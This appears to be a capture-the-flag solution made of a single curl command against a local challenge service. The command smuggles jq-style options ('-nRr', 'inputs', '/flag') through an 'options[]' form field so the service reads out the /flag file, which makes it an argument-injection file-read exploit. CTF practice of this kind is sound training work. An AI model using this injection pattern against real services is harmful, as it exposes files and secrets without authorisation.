# Solution

```
curl -XPOST 'http://localhost:8087/' -F "filter=a" -F "json=b" -F "options[]=-nRr" -F "options[]=inputs" -F "options[]=/flag"
